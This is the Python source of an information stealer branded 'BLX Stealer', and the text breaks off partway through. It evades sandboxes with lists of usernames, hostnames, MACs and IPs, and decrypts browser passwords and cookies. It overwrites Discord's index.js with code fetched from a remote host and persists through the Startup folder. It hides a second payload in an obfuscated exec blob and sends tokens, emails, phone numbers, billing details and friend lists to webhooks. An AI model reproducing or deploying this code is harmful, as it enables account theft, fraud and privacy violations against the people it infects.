import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from tokenize import Token
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import sys
import subprocess
import uuid
import socket
import getpass

blacklistUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def checkvm():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

checkvm()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

mac_address = uuid.getnode()
if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
    os._exit(0)

sblacklist = ['88.132.231.71', '207.102.138.83', '174.7.32.199', '204.101.161.32', '207.102.138.93', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']

ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').strip()

if ip in sblacklist:
    exit()

hook = "YOUR WEBHOOK HERE"
inj3c710n_url = "https://raw.githubusercontent.com/blxstealer/main/main/index.js"
color =  0x812118
DETECTED = False


def g371P():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

requirements = [
    ["requests", "requests"],
    ["Crypto.Cipher", "pycryptodome"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(f"{executable} -m pip install {modl[1]}", shell=True)
        time.sleep(3)

import requests
from Crypto.Cipher import AES

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def g37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return g37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def L04Dr3QU3575(methode, url, data='', files='', headers=''):
    for i in range(8): # max trys
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def L04DUr118(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except: 
            pass

def g108411NF0():
    ip = g371P()
    username = os.getenv("USERNAME")
    ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
    # print(ipdatanojson)
    ipdata = loads(ipdatanojson)
    # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
    contry = ipdata["country_name"]
    contryCode = ipdata["country_code"].lower()
    g108411NF0 = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
    # print(globalinfo)
    return g108411NF0


def TrU57(C00K13s):
    # simple Trust Factor system
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    # print(len(tim))
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED
        
def inj3c710n():

    username = os.getlogin()

    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']

    for folder_name in folder_list:
        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
        if os.path.isdir(deneme_path):
            for subdir, dirs, files in os.walk(deneme_path):
                if 'app-' in subdir:
                    for dir in dirs:
                        if 'modules' in dir:
                            module_path = os.path.join(subdir, dir)
                            for subsubdir, subdirs, subfiles in os.walk(module_path):
                                if 'discord_desktop_core-1' in subsubdir:
                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
                                        if 'discord_desktop_core' in subsubsubdir:
                                            for file in subsubfiles:
                                                if file == 'index.js':
                                                    file_path = os.path.join(subsubsubdir, file)

                                                    inj3c710n_cont = requests.get(inj3c710n_url).text

                                                    inj3c710n_cont = inj3c710n_cont.replace("%WEBHOOK%", hook)

                                                    with open(file_path, "w", encoding="utf-8") as index_file:
                                                        index_file.write(inj3c710n_cont)
inj3c710n()


def G37UHQFr13ND5(token):
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<a:developer:1095726251001520252> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
    ]
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
    except:
        return False

    uhqlist = ''
    for friend in friendlist:
        OwnedBadges = ''
        flags = friend['user']['public_flags']
        for badge in badgeList:
            if flags // badge["Value"] != 0 and friend['type'] == 1:
                if not "House" in badge["Name"]:
                    OwnedBadges += badge["Emoji"]
                flags = flags % badge["Value"]
        if OwnedBadges != '':
            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
    return uhqlist 


def G3781111N6(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False
    
    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing


def G3784D63(flags):
    if flags == 0: return ''

    OwnedBadges = ''
    badgeList =  [
        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "developer:1095726251001520252> "},
        {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<a:bughunter2:1095726038031548456> "},
        {"Name": 'Active_Developer', 'Value': 4194304, 'Emoji': "<a:activedev:1095725933236858991> "},
        {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early:1095728685144870922> "},
        {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Brilliance', 'Value': 128, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'House_Bravery', 'Value': 64, 'Emoji': "<a:squad:1095728662386577438> "},
        {"Name": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': "<a:bughunter:1095725763006844948> "},
        {"Name": 'HypeSquad_Events', 'Value': 4, 'Emoji': "<a:hypesquad:1095730117327724626> "},
        {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<a:partner:1095725986731004005> "},
        {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<a:staff:1095725959627427861> "}
    ]
    for badge in badgeList:
        if flags // badge["Value"] != 0:
            OwnedBadges += badge["Emoji"]
            flags = flags % badge["Value"]

    return OwnedBadges

def G3770K3N1NF0(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson: 
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<a:subscriber:1095725882250895481> "
        elif nitrot == 2:
            nitro = "<a:boost:1095740247540776991> <a:subscriber:1095725882250895481> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`'

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def CH3CK70K3N(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))

fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)

startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)

if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)

import random ,base64,codecs,zlib;pyobfuscate=""

obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(chr)'],['''v+7s$nQmFlSy?pTG4r_q7f)<m5q<)Z#4c)7;>{6wUVj~QuHk5|mjosFCl*C=Rlq6Hj@0j<Z0kfrdVAg'''.replace('\n','')]))

_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

def UP104D70K3N(token, path):
    global hook
    global tgmx
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)


    if pfp == None: 
        pfp = "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
    else:
        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"

    billing = G3781111N6(token)
    badge = G3784D63(flags)
    friends = G37UHQFr13ND5(token)
    if friends == '': friends = "No HQ Friends"
    if not billing:
        badge, phone, billing = "🔒", "🔒", "🔒"
    if nitro == '' and badge == '': nitro = " -"

    data = {
        "content": f'{g108411NF0()} | Found in `{path}`',
        "embeds": [
            {
            "color": color,
            "fields": [
                {
                    "name": "<:hackerblack:1095747410539593800> Token:",
                    "value": f"`{token}`\n[Click To Copy](https://superfurrycdn.nl/copy/{token})"
                },
                {
                    "name": "<:mail:1095741024678191114> Email:",
                    "value": f"`{email}`",
                    "inline": True
                },
                {
                    "name": "<:phone:1095741029832990720> Phone:",
                    "value": f"{phone}",
                    "inline": True
                },
                {
                    "name": "<a:blackworld:1095741984385290310> IP:",
                    "value": f"`{g371P()}`",
                    "inline": True
                },
                {
                    "name": "<a:black_hypesquad:1095742323423453224> Badges:",
                    "value": f"{nitro}{badge}",
                    "inline": True
                },
                {
                    "name": "<a:blackmoneycard:1095741026850852965> Billing:",
                    "value": f"{billing}",
                    "inline": True
                },
                {
                    "name": "<:blackmember:1095740314683179139>  HQ Friends:",
                    "value": f"{friends}",
                    "inline": False
                }
                ],
            "author": {
                "name": f"{username}#{hashtag} ({idd})",
                "icon_url": f"{pfp}"
                },
            "footer": {
                "text": "BLX Stealer",
                "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                },
            "thumbnail": {
                "url": f"{pfp}"
                }
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
        "username": "BLX Stealer | t.me/blxstealer",
        "attachments": []
        }
    urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
    L04DUr118(hook, data=dumps(data).encode(), headers=headers)
    

def R3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def UP104D(name, link):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "lxcook":
        rb = ' | '.join(da for da in c00K1W0rDs)
        if len(rb) > 1000: 
            rrrrr = R3F0rM47(str(c00K1W0rDs))
            rb = ' | '.join(da for da in rrrrr)
        data = {
            "content": g108411NF0(),
            "embeds": [
                {
                    "title": "BLX Stealer | Cookies",
                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:blackmember:1095740314683179139>  • **{C00K1C0UNt}** Cookies Found \n <:blackarrow:1095740975197995041> • [BLXCookies.txt]({link})",
                    "color": color,
                    "footer": {
                        "text": "BLX Stealer",
                        "icon_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484"
                    }
                }
            ],
            "username": "BLX Stealer | t.me/blxstealer",
            "avatar_url": "https://media.discordapp.net/attachments/1077055672899870770/1105878341560586410/Picsart_23-05-10_18-25-19-907.png?width=484&height=484",
            "attachments": []
            }
        urlopen(Request(tgmx, data=dumps(data).encode(), headers=headers))
        L04DUr118(hook, data=dumps(data).encode(), headers=headers)
        return

    if name == "lxpassw":
        ra = ' | '.join(da for da in p45WW0rDs)
        if len(ra) > 1000: 
            rrr = R3F0rM47(str(p45WW0rDs))
            ra = ' | '.join(da for da in rrr)

        data = {
            "content": g108411NF0(),
            "embeds": [
                {
